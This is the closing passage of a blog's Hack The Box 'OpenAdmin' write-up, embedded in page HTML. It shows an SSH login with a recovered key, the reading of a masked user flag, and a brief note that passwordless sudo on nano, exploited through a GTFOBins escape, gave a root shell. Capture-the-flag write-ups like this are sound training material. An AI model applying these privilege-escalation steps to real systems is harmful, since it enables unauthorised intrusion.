+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+~/htb/OpenAdmin$ ssh joanna@OpenAdmin -i joanna.key
+Enter passphrase for key &#39;joanna.key&#39;:
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+[...]
+Last login: Thu Jan  2 21:12:40 2020 from 10.10.X.X
+joanna@openadmin:~$ ls
+user.txt
+joanna@openadmin:~$ cat user.txt
+c9b2cf0************************
+</code></pre>
+  </div>
+
+</p>
+<p>And we finally got the user flag.</p>
+<h2 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Using the tool <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a>, we discover that we can execute <code>sudo /bin/nano /opt/priv</code> without providing a password. Using the following <a href="https://gtfobins.github.io/gtfobins/nano/">nano GTFBin</a>, we get a root shell, and with it the root flag.</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://raulmart.in/posts/h-c0n-papify-writeup/">
+                <span class="button__icon">←</span>
+                <span class="button__text">H-c0n 2020 qualifier Papify (1&amp;2)</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://raulmart.in/posts/postman-writeup/">
+                <span class="button__text">Postman HTB WriteUp</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script src="https://raulmart.in/js/menu.js"></script>
+<script src="https://raulmart.in/js/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
